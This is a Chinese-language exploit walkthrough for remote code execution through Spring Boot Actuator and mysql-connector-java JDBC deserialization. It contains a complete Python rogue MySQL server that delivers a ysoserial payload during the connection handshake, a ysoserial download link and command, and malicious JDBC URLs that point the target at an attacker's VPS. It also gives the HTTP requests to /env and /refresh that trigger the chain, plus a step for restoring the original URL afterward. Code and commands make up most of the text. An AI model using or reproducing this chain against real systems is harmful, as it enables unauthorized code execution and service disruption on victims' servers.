Spring Boot mysql jdbc deserialization rce
==========================================

一、漏洞简介
------------

#### 利用条件：

-   可以 POST 请求目标网站的 `/env` 接口设置属性
-   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在
    `spring-boot-starter-actuator` 依赖）
-   目标环境中存在 `mysql-connector-java` 依赖
-   目标可以请求攻击者的服务器（请求可出外网）

二、漏洞影响
------------

三、复现过程
------------

### 漏洞分析

1.  spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址
2.  refresh 刷新后设置了一个新的 spring.datasource.url 属性值
3.  当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url
    建立新的数据库连接
4.  然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload
    数据
5.  目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成
    RCE 漏洞

### 漏洞复现

##### 步骤一：查看环境依赖

GET 请求 `/env` 或 `/actuator/env`，搜索环境变量（classpath）中是否有
`mysql-connector-java` 关键词，并记录下其版本号（5.x 或 8.x）；

搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如
`commons-collections`、`Jdk7u21`、`Jdk8u20` 等；

搜索 `spring.datasource.url` 关键词，记录下其 `value`
值，方便后续恢复其正常 jdbc url 值。

##### 步骤二：架设恶意 rogue mysql server

在自己控制的服务器上运行springboot-jdbc-deserialization-rce.py脚本，并使用ysoserial自定义要执行的命令：

    springboot-jdbc-deserialization-rce.py
    #!/usr/bin/env python
    # coding: utf-8
    # -**- Author: LandGrey -**-

    import os
    import socket
    import binascii


    def server_send(conn, payload):
        global count
        count += 1
        print("[*] Package order: {}, Send: {}".format(count, payload))
        conn.send(binascii.a2b_hex(payload))


    def server_receive(conn):
        global count, BUFFER_SIZE

        count += 1
        data = conn.recv(BUFFER_SIZE)
        print("[*] Package order: {}, Receive: {}".format(count, data))
        return str(data).lower()


    def run_mysql_server():
        global count, deserialization_payload

        while True:
            count = 0
            conn, addr = server_socks.accept()
            print("[+] Connection from client -> {}:{}".format(addr[0], addr[1]))
            greeting = '4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400'
            server_send(conn, greeting)
            if os.path.isfile(deserialization_file):
                with open(deserialization_file, 'rb') as _f:
                    deserialization_payload = binascii.b2a_hex(_f.read())
            while True:
                # client auth
                server_receive(conn)
                server_send(conn, response_ok)

                # client query
                data = server_receive(conn)
                if "session.auto_increment_increment" in data:
                    _payload = '01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200'
                    server_send(conn, _payload)
                    data = server_receive(conn)
                if "show warnings" in data:
                    _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                    server_send(conn, _payload)
                    data = server_receive(conn)
                if "set names" in data:
                    server_send(conn, response_ok)
                    data = server_receive(conn)
                if "set character_set_results" in data:
                    server_send(conn, response_ok)
                    data = server_receive(conn)
                if "show session status" in data:
                    _data = '0100000102'
                    _data += '2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000'
                    _data += '2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000'
                    _payload_hex = str(hex(len(deserialization_payload)/2)).replace('0x', '').zfill(4)
                    _payload_length = _payload_hex[2:4] + _payload_hex[0:2]
                    _data_hex = str(hex(len(deserialization_payload)/2 + 5)).replace('0x', '').zfill(6)
                    _data_lenght = _data_hex[4:6] + _data_hex[2:4] + _data_hex[0:2]
                    _data += _data_lenght + '04' + '0131fc' + _payload_length + deserialization_payload
                    _data += '07000005fe000022000100'
                    server_send(conn, _data)
                    data = server_receive(conn)
                if "show warnings" in data:
                    _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                    server_send(conn, _payload)

                break
            try:
                conn.close()
            except Exception as e:
                pass


    if __name__ == "__main__":
        HOST = "0.0.0.0"
        PORT = 3306

        deserialization_file = r'payload.ser'
        if os.path.isfile(deserialization_file):
            with open(deserialization_file, 'rb') as f:
                deserialization_payload = binascii.b2a_hex(f.read())
        else:
            deserialization_payload = 'aced****(your deserialized hex data)'

        count = 0
        BUFFER_SIZE = 1024
        response_ok = '0700000200000002000000'
        print("[+] rogue mysql server Listening on {}:{}".format(HOST, PORT))
        server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socks.bind((HOST, PORT))
        server_socks.listen(1)

        run_mysql_server()
    https://download.0-sec.org/download/ysoserial.zip
    java -jar ysoserial.jar CommonsCollections3 calc > payload.ser

在脚本**同目录下**生成 `payload.ser` 反序列化 payload 文件，供脚本使用。

##### 步骤三：设置 spring.datasource.url 属性

> ⚠️
> 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！

mysql-connector-java 5.x 版本设置**属性值**为：

    jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true

mysql-connector-java 8.x 版本设置**属性值**为：

    jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true

spring 1.x

    POST /env
    Content-Type: application/x-www-form-urlencoded

    spring.datasource.url=对应属性值

spring 2.x

    POST /actuator/env
    Content-Type: application/json

    {"name":"spring.datasource.url","value":"对应属性值"}

##### 步骤四：刷新配置

spring 1.x

    POST /refresh
    Content-Type: application/x-www-form-urlencoded

spring 2.x

    POST /actuator/refresh
    Content-Type: application/json

##### 步骤五：触发数据库查询

尝试访问网站已知的数据库查询的接口，例如： `/product/list`
，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发

##### 步骤六：恢复正常 jdbc url

反序列化漏洞利用完成后，使用 **步骤三** 的方法恢复 **步骤一** 中记录的
`spring.datasource.url` 的原始 `value` 值
